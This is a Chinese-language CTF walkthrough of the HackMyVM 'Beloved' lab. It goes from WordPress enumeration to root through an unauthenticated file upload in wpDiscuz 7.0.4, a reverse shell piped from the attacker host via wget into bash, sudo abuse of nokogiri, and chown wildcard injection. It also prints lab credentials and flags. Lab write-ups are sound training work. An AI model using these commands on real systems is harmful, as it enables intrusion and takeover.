# Beloved

2024-11-16 https://hackmyvm.eu/machines/machine.php?vm=Beloved

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

发现 80web 是 wordpress, 先用 gobuster 扫描看看有没有隐藏目录，发现跳转到域名 beloved 在 /etc/hosts 中添加这个域名：

```
gobuster dir -q -t 64 -e -k --exclude-length 162 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,zip -u http://beloved/
```

发现 .git 目录：

```
http://beloved/.git/
```

尝试使用 GitHack 导出其信息，404 没有成功

在用 wpscan 扫描：

```
wpscan --url http://beloved/ -e u,ap,at --plugins-detection mixed
```

发现用户名: smart_ass, 使用 cewl 收集网页中的单词作为密码，但是没有爆破出密码。

看看插件有没有漏洞：

```
[+] akismet
Latest Version: 5.3.3

[+] feed
Location: http://192.168.5.39/wp-content/plugins/feed/

[+] wpdiscuz
Version: 7.0.4 (80% confidence)
```

经过 searchsploit 搜索，发现 wpdiscuz 7.0.4 存在未授权的文件 RCE 和文件上传漏洞，先看看 RCE(http://beloved/2021/06/09/hello-world/ 中有回复框可以上传图片，这里是利用点):

```
python3 49967.py -u http://beloved -p /2021/06/09/hello-world/
```

上传 shell 成功，进行访问验证(得到 www-data)：

```
http://beloved/wp-content/uploads/2024/11/dgwxynmnwumjwpo-1731751207.694.php?cmd=id
```

直接获得反弹的 shell：

```
curl -G --data-urlencode 'cmd=wget -q -O - http://192.168.5.3/5-3/8888.sh|bash' http://beloved/wp-content/uploads/2024/11/dgwxynmnwumjwpo-1731751207.694.php
```

先得到 wp-config.php 中的数据库配置信息：

```
define( 'DB_USER', 'wordpress_user' );
define( 'DB_PASSWORD', 'secure_password_2021!!!' );
define( 'DB_HOST', 'localhost' );
```

/etc/passwd 中只发现一个常规用户: beloved

sudo -l 发现：

```
(beloved) NOPASSWD: /usr/local/bin/nokogiri
```

并且发现了使用方法：

```
www-data@beloved:/var/www$ cat .bash_history
stty rows 57 cols 236
export TERM=xterm
clear
sudo -l
sudo -u beloved /usr/local/bin/nokogiri --help
sudo -u beloved /usr/local/bin/nokogiri /etc/passwd
```

开始利用：

```
sudo -u beloved /usr/local/bin/nokogiri /etc/passwd
irb(main):001:0> system "/bin/bash"
```

得到了用户 beloved 的 shell,获取到了 user flag：

```
beloved@beloved:~$ cat user.txt
020588f87676a40236192c324c1a57fc
```

在这个用户的 .bash_history 中看到使用了 pspy，使用 pspy 查看后台服务,发现：

```
/bin/sh -c cd /opt && chown root:root *
```

发现 /opt 中有一个 id_rsa 文件，但是是 root 权限无法读取，看到 chown 后面是跟了星号，这里可以进行利用将权限转移：

```
cd /opt
touch test && touch '--reference=test'
```

过了 1 分钟 就读取到了 id_rsa 的内容，然后使用这个私钥登陆 root 用户，最终获得了 root flag：

```
root@beloved:~# ls
root.txt
root@beloved:~# cat root.txt
d585a3099ec825ec1c086b50ce8ff7d3
```
